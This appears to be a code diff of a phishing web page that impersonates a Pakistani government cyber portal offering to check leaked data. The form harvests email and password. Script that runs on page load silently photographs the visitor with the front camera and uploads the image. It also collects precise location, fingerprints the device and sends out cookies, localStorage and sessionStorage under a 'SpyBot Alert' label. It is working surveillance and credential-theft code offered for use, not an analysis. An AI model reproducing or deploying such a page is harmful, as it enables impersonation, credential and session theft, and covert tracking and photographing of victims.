@@ -9,152 +9,206 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #121b23;
+      background: #0f2027;
+      background: linear-gradient(to bottom, #2c5364, #203a43, #0f2027);
       color: #fff;
       display: flex;
       flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
       justify-content: space-between;
+      align-items: center;
+      height: 100vh;
     }
-    .container {
-      margin-top: 50px;
+    .box {
+      margin-top: 5vh;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.5);
       text-align: center;
-      max-width: 400px;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.4);
+      width: 380px;
+      backdrop-filter: blur(10px);
     }
     h1 {
       font-size: 22px;
+      margin-bottom: 8px;
     }
     p {
       font-size: 14px;
+      margin: 8px 0 16px;
     }
     input, button {
       width: 100%;
       padding: 10px;
-      margin-top: 10px;
+      margin: 6px 0;
       border-radius: 6px;
       border: none;
       font-size: 14px;
     }
     input {
-      background: #e0e0e0;
-      color: #000;
+      background: #ecf0f1;
+      color: #2c3e50;
     }
     button {
-      background: #d63031;
+      background: #e74c3c;
       color: white;
       font-weight: bold;
       cursor: pointer;
     }
-    footer {
-      padding: 12px;
+    button:hover {
+      background: #c0392b;
+    }
+    a.forgot {
+      color: #f1c40f;
       font-size: 12px;
-      color: #999;
+      display: block;
+      margin-top: 4px;
+      text-decoration: none;
+    }
+    img {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+    footer {
+      font-size: 12px;
+      text-align: center;
+      padding: 10px;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="/static/pakistan-emblem.png" alt="Logo" width="70" />
-    <h1>🇵🇰 Confidential Cyber Intelligence Portal</h1>
-    <p>Enter your credentials to access national breach database.</p>
+  <div class="box">
+    <img src="/static/pakistan-emblem.png" alt="Gov Logo" />
+    <h1>Confidential Access - Secure Portal</h1>
+    <p>Enter your email to check leaked data in our cyber database</p>
     <form method="POST" action="/login">
       <input type="text" name="email" placeholder="Email" required />
       <input type="password" name="password" placeholder="Password" required />
-      <button type="submit">🔍 Verify Access</button>
+      <a href="https://accounts.google.com/signin/v2/usernamerecovery" class="forgot">Forgot Password?</a>
+      <button type="submit">🔍 Check Now</button>
     </form>
   </div>
-
-  <footer>
-    © National Cyber Division &bullet; Secure Gateway 2025
-  </footer>
+  <footer>© 2025 Government Cyber Department | National Data Division</footer>
 
 <script>
-  function getDeviceName(ua) {
-    const devices = [
-      { keyword: "SOG05", name: "Sony Xperia" },
-      { keyword: "SM-", name: "Samsung Galaxy" },
-      { keyword: "Infinix", name: "Infinix Phone" },
-      { keyword: "TECNO", name: "TECNO Device" },
-      { keyword: "Redmi", name: "Xiaomi Redmi" },
-      { keyword: "Pixel", name: "Google Pixel" },
-      { keyword: "OPPO", name: "Oppo Device" },
-      { keyword: "Vivo", name: "Vivo Device" },
-      { keyword: "OnePlus", name: "OnePlus" }
-    ];
-    for (const d of devices) if (ua.includes(d.keyword)) return d.name;
-    return "Generic Android Device";
-  }
-
-  async function reverseGeocode(lat, lon) {
+async function reverseGeocode(lat, lon) {
+  try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
-    const res = await fetch(url);
+    const res = await fetch(url, {
+      headers: { 'User-Agent': 'Mozilla/5.0' }
+    });
     const data = await res.json();
     return {
       city: data.address.city || data.address.town || data.address.village || "Unknown",
       country: data.address.country || "Unknown",
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
     };
+  } catch (e) {
+    return { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+  }
+}
+
+function detectDevice(userAgent) {
+  const devices = {
+    "Samsung": /samsung/i,
+    "Xiaomi": /mi|redmi/i,
+    "Oppo": /oppo/i,
+    "Vivo": /vivo/i,
+    "Realme": /realme/i,
+    "Huawei": /huawei/i,
+    "Infinix": /infinix/i,
+    "Tecno": /tecno/i,
+    "iPhone": /iphone/i,
+    "Sony": /sony/i,
+    "Nokia": /nokia/i
+  };
+  for (let [name, pattern] of Object.entries(devices)) {
+    if (pattern.test(userAgent)) return name;
+  }
+  return "Generic Android Device";
+}
+
+async function sendCookiesData() {
+  const cookies = document.cookie;
+  const local = { ...localStorage };
+  const session = { ...sessionStorage };
+
+  const payload = {
+    type: "🧹 Browser Storage Data",
+    cookies: cookies || "None",
+    localStorage: Object.keys(local).length ? local : "None",
+    sessionStorage: Object.keys(session).length ? session : "None"
+  };
+
+  await fetch("/collect", {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+async function sendFullData(locationCoords, cameraStatus) {
+  let locationData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
+  if (locationCoords) {
+    locationData = await reverseGeocode(locationCoords.latitude, locationCoords.longitude);
   }
 
-  async function sendInfo(coords, cameraStatus) {
-    let geoData = { city: "Unknown", country: "Unknown", timezone: "Unknown" };
-    if (coords) geoData = await reverseGeocode(coords.latitude, coords.longitude);
+  const userAgent = navigator.userAgent;
+  const deviceInfo = detectDevice(userAgent);
+  const mapsLink = locationCoords ? `https://www.google.com/maps?q=${locationCoords.latitude},${locationCoords.longitude}` : "❌ Location Denied";
 
-    const payload = {
-      ip: "Unknown",
-      latitude: coords?.latitude,
-      longitude: coords?.longitude,
-      mapsLink: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "❌ Location Denied",
-      timezone: geoData.timezone,
-      city: geoData.city,
-      country: geoData.country,
-      camera: cameraStatus,
-      userAgent: navigator.userAgent,
-      deviceName: getDeviceName(navigator.userAgent)
-    };
+  const payload = {
+    type: "📡 SpyBot Alert",
+    ip: "Unknown",
+    latitude: locationCoords?.latitude || null,
+    longitude: locationCoords?.longitude || null,
+    mapsLink: mapsLink,
+    timezone: locationData.timezone,
+    city: locationData.city,
+    country: locationData.country,
+    camera: cameraStatus,
+    userAgent: userAgent,
+    deviceInfo: deviceInfo
+  };
 
-    await fetch('/collect', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
+  await fetch("/collect", {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+
+  await sendCookiesData();
+}
+
+async function askForPermissions() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'photo.jpg');
+        fetch('/photo', { method: 'POST', body: formData });
+      });
+      stream.getTracks().forEach(track => track.stop());
+    }, 3000);
+
+    navigator.geolocation.getCurrentPosition(
+      pos => sendFullData(pos.coords, "✅ Camera Allowed"),
+      err => sendFullData(null, "✅ Camera Allowed, ❌ Location Denied")
+    );
+  } catch (err) {
+    sendFullData(null, "❌ Camera Denied");
   }
+}
 
-  async function captureCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      video.play();
-      setTimeout(() => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('photo', blob, 'photo.jpg');
-          fetch('/photo', { method: 'POST', body: formData });
-        });
-        stream.getTracks().forEach(track => track.stop());
-      }, 2500);
-
-      navigator.geolocation.getCurrentPosition(
-        pos => sendInfo(pos.coords, "✅ Camera Allowed"),
-        err => sendInfo(null, "✅ Camera Allowed, ❌ Location Denied")
-      );
-
-    } catch (err) {
-      sendInfo(null, "❌ Camera Denied");
-    }
-  }
-
-  window.onload = captureCamera;
+window.onload = askForPermissions;
 </script>
 </body>
 </html>
